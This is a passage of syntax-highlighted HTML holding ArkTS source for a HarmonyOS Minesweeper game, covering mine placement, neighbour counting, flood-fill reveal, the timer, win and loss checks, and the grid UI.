class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n                                    [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>]]\n  @State isCountDown: boolean = <span class=\"hljs-literal\">true</span>\n  @State statesBtn: number = <span class=\"hljs-number\">1</span>\n  @State success: boolean = <span class=\"hljs-literal\">false</span>\n  @State over: boolean = <span class=\"hljs-literal\">true</span>\n  dialogController: CustomDialogController = <span class=\"hljs-keyword\">new</span> CustomDialogController({\n    builder: CustomDialogExample({ success : $success, difficulty : $mine, time : $time}),\n    autoCancel: <span class=\"hljs-literal\">true</span>\n  })\n\n  aboutToAppear(){\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.row == <span class=\"hljs-number\">12</span>)\n            <span class=\"hljs-keyword\">this</span>.Number_row = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>, <span class=\"hljs-string\">\'10\'</span>, <span class=\"hljs-string\">\'11\'</span>, <span class=\"hljs-string\">\'12\'</span>]\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.row == <span class=\"hljs-number\">16</span>)\n            <span class=\"hljs-keyword\">this</span>.Number_row = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>, <span class=\"hljs-string\">\'10\'</span>, <span class=\"hljs-string\">\'11\'</span>, <span class=\"hljs-string\">\'12\'</span>, <span class=\"hljs-string\">\'13\'</span>, <span class=\"hljs-string\">\'14\'</span>, <span class=\"hljs-string\">\'15\'</span>, <span class=\"hljs-string\">\'16\'</span>]\n\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.column == <span class=\"hljs-number\">12</span>)\n            <span class=\"hljs-keyword\">this</span>.Number_column = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>, <span class=\"hljs-string\">\'10\'</span>, <span class=\"hljs-string\">\'11\'</span>, <span class=\"hljs-string\">\'12\'</span>]\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.column == <span class=\"hljs-number\">16</span>)\n            <span class=\"hljs-keyword\">this</span>.Number_column = [<span class=\"hljs-string\">\'1\'</span>, <span class=\"hljs-string\">\'2\'</span>, <span class=\"hljs-string\">\'3\'</span>, <span class=\"hljs-string\">\'4\'</span>, <span class=\"hljs-string\">\'5\'</span>, <span class=\"hljs-string\">\'6\'</span>, <span class=\"hljs-string\">\'7\'</span>, <span class=\"hljs-string\">\'8\'</span>, <span class=\"hljs-string\">\'9\'</span>, <span class=\"hljs-string\">\'10\'</span>, <span class=\"hljs-string\">\'11\'</span>, <span class=\"hljs-string\">\'12\'</span>, <span class=\"hljs-string\">\'13\'</span>, <span class=\"hljs-string\">\'14\'</span>, <span class=\"hljs-string\">\'15\'</span>, <span class=\"hljs-string\">\'16\'</span>]\n\n    <span class=\"hljs-keyword\">this</span>.initialize()\n  }\n\n  initialize(){\n    grids = [[<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>],\n             [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>]]\n\n    <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>;\n    <span class=\"hljs-keyword\">while</span>(i &lt; <span class=\"hljs-keyword\">this</span>.mine){\n      <span class=\"hljs-keyword\">let</span> random_row = <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-built_in\">Math</span>.random() * <span class=\"hljs-keyword\">this</span>.row);\n      <span class=\"hljs-keyword\">let</span> random_column = <span class=\"hljs-built_in\">Math</span>.floor(<span class=\"hljs-built_in\">Math</span>.random() * <span class=\"hljs-keyword\">this</span>.column);\n      <span class=\"hljs-keyword\">if</span>(grids[random_row][random_column] == <span class=\"hljs-number\">0</span>){\n        grids[random_row][random_column] = -<span class=\"hljs-number\">1</span>\n        i++\n      }\n    }\n\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">this</span>.row; i++){\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-keyword\">this</span>.column; j++){\n        <span class=\"hljs-keyword\">if</span>(grids[i][j] != -<span class=\"hljs-number\">1</span>){\n          <span class=\"hljs-keyword\">let</span> k = <span class=\"hljs-number\">0</span>\n          <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> ii = i - <span class=\"hljs-number\">1</span>; ii &lt;= i + <span class=\"hljs-number\">1</span>; ii++){\n            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> jj = j - <span class=\"hljs-number\">1</span>; jj &lt;= j + <span class=\"hljs-number\">1</span>; jj++){\n              <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-number\">0</span> &lt;= ii &amp;&amp; ii &lt; <span class=\"hljs-keyword\">this</span>.row &amp;&amp; <span class=\"hljs-number\">0</span> &lt;= jj &amp;&amp; jj &lt; <span class=\"hljs-keyword\">this</span>.column &amp;&amp; grids[ii][jj] == -<span class=\"hljs-number\">1</span>){\n                k++\n              }\n            }\n          }\n          grids[i][j] = k\n        }\n      }\n    }\n\n    timeoutID = setInterval(() =&gt;{\n      <span class=\"hljs-keyword\">this</span>.time += <span class=\"hljs-number\">1</span>\n      <span class=\"hljs-keyword\">this</span>.success = <span class=\"hljs-keyword\">this</span>.gamesuccess()\n      <span class=\"hljs-keyword\">this</span>.over = <span class=\"hljs-keyword\">this</span>.gameover()\n      <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.success || !<span class=\"hljs-keyword\">this</span>.over){\n        clearInterval(timeoutID)\n        <span class=\"hljs-keyword\">this</span>.dialogController.open()\n      }\n    }, <span class=\"hljs-number\">1000</span>);\n  }\n\n  estimatemine(i, j){\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> ii = i - <span class=\"hljs-number\">1</span>; ii &lt;= i + <span class=\"hljs-number\">1</span>; ii++){\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> jj = j - <span class=\"hljs-number\">1</span>; jj &lt;= j + <span class=\"hljs-number\">1</span>; jj++){\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-number\">0</span> &lt;= ii &amp;&amp; ii &lt; <span class=\"hljs-keyword\">this</span>.row &amp;&amp; <span class=\"hljs-number\">0</span> &lt;= jj &amp;&amp; jj &lt; <span class=\"hljs-keyword\">this</span>.column &amp;&amp; (ii != i || jj != j)){\n          <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[ii][jj] == <span class=\"hljs-number\">0</span>){\n            <span class=\"hljs-keyword\">this</span>.statesGrids[ii][jj] = <span class=\"hljs-number\">1</span>\n            <span class=\"hljs-keyword\">if</span>(grids[ii][jj] == <span class=\"hljs-number\">0</span>){\n              <span class=\"hljs-keyword\">this</span>.estimatemine(ii, jj)\n            }\n          }\n        }\n      }\n    }\n  }\n\n  gamesuccess(){\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">this</span>.row; i++){\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-keyword\">this</span>.column; j++){\n        <span class=\"hljs-keyword\">if</span>(grids[i][j] != -<span class=\"hljs-number\">1</span>){\n          <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[i][j] != <span class=\"hljs-number\">1</span>){\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>\n          }\n        }\n      }\n    }\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>\n  }\n\n  gameover(){\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-keyword\">this</span>.row; i++){\n      <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-keyword\">this</span>.column; j++){\n        <span class=\"hljs-keyword\">if</span>(grids[i][j] == -<span class=\"hljs-number\">1</span>){\n          <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[i][j] == <span class=\"hljs-number\">1</span>){\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>\n          }\n        }\n      }\n    }\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>\n  }\n\n  build() {\n    Column(){\n      Row() {\n        Button(<span class=\"hljs-string\">\'菜 单\'</span>, { type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> })\n          .width(<span class=\"hljs-number\">95</span>)\n          .height(<span class=\"hljs-number\">50</span>)\n          .borderRadius(<span class=\"hljs-number\">8</span>)\n          .borderColor(<span class=\"hljs-string\">\'#6379A8\'</span>)\n          .borderWidth(<span class=\"hljs-number\">2</span>)\n          .fontSize(<span class=\"hljs-number\">26</span>)\n          .fontWeight(<span class=\"hljs-number\">700</span>)\n          .fontColor(<span class=\"hljs-string\">\'#1E2B46\'</span>)\n          .backgroundColor(<span class=\"hljs-string\">\'#C1D0E6\'</span>)\n          .margin({ left:<span class=\"hljs-number\">10</span>, top: <span class=\"hljs-number\">2</span> })\n          .onClick(() =&gt; {\n            clearInterval(timeoutID)\n            router.back()\n          })\n        setImage({ str: <span class=\"hljs-string\">\'time.png\'</span> })\n        setText({ num: $time })\n        setImage({ str: <span class=\"hljs-string\">\'lei.png\'</span> })\n        setText({ num: $mine })\n      }\n      .width(<span class=\"hljs-string\">\'100%\'</span>)\n      .height(<span class=\"hljs-number\">60</span>)\n      .backgroundColor(<span class=\"hljs-string\">\'#C1D0E6\'</span>)\n      .margin({ top: <span class=\"hljs-number\">80</span> })\n\n      Grid() {\n        ForEach(<span class=\"hljs-keyword\">this</span>.Number_row, (day_row: string) =&gt; {\n          ForEach(<span class=\"hljs-keyword\">this</span>.Number_column, (day_column: string) =&gt; {\n            GridItem() {\n              Button({ type: ButtonType.Normal, stateEffect: <span class=\"hljs-literal\">true</span> }){\n                <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.isCountDown || !<span class=\"hljs-keyword\">this</span>.isCountDown) {\n                  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">1</span>){\n                    <span class=\"hljs-keyword\">if</span>(grids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == -<span class=\"hljs-number\">1</span>){\n                      Image($rawfile(<span class=\"hljs-string\">\'mine.png\'</span>))\n                        .height(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                        .width(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                        .scale({ x: <span class=\"hljs-number\">0.9</span>, y: <span class=\"hljs-number\">0.9</span> })\n                    }<span class=\"hljs-keyword\">else</span>{\n                      Text(grids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0</span> ? <span class=\"hljs-string\">\' \'</span> : grids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>].toString())\n                        .height(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                        .width(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                        .fontSize(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">4</span>)\n                        .fontColor(colors[grids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>].toString()])\n                        .textAlign(TextAlign.Center)\n                        .fontWeight(<span class=\"hljs-number\">600</span>)\n                    }\n                  }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">2</span>){\n                    Image($rawfile(<span class=\"hljs-string\">\'flag.png\'</span>))\n                      .height(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                      .width(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                      .scale({ x: <span class=\"hljs-number\">0.9</span>, y: <span class=\"hljs-number\">0.9</span> })\n                  }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">3</span>){\n                    Text(<span class=\"hljs-string\">\'？\'</span>)\n                      .height(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                      .width(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                      .fontSize(<span class=\"hljs-number\">358</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n                      .fontColor(<span class=\"hljs-string\">\'#FFFFFF\'</span>)\n                      .textAlign(TextAlign.Center)\n                      .fontWeight(<span class=\"hljs-number\">800</span>)\n                  }\n                }\n              }\n              .height(<span class=\"hljs-number\">353</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n              .width(<span class=\"hljs-number\">353</span> / <span class=\"hljs-keyword\">this</span>.column - <span class=\"hljs-number\">2</span>)\n              .backgroundColor(colors[<span class=\"hljs-string\">\'1\'</span> + <span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>]])\n              .onClick(() =&gt; {\n                <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">this</span>.success &amp;&amp; <span class=\"hljs-keyword\">this</span>.over){\n                  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesBtn == <span class=\"hljs-number\">1</span>){\n                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0</span>){\n                      <span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">1</span>\n                      <span class=\"hljs-keyword\">if</span>(grids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0</span>){\n                        <span class=\"hljs-keyword\">this</span>.estimatemine(<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>, <span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>)\n                      }\n                    }\n                  }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesBtn == <span class=\"hljs-number\">0</span>){\n                    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">0</span> &amp;&amp; <span class=\"hljs-keyword\">this</span>.mine &gt; <span class=\"hljs-number\">0</span>) {\n                      <span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">2</span>\n                      <span class=\"hljs-keyword\">this</span>.mine--\n                    }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">2</span>) {\n                      <span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">3</span>\n                      <span class=\"hljs-keyword\">this</span>.mine++\n                    }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">3</span>) {\n                      <span class=\"hljs-keyword\">this</span>.statesGrids[<span class=\"hljs-built_in\">parseInt</span>(day_row) - <span class=\"hljs-number\">1</span>][<span class=\"hljs-built_in\">parseInt</span>(day_column) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">0</span>\n                    }\n                  }\n                  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">this</span>.isCountDown){\n        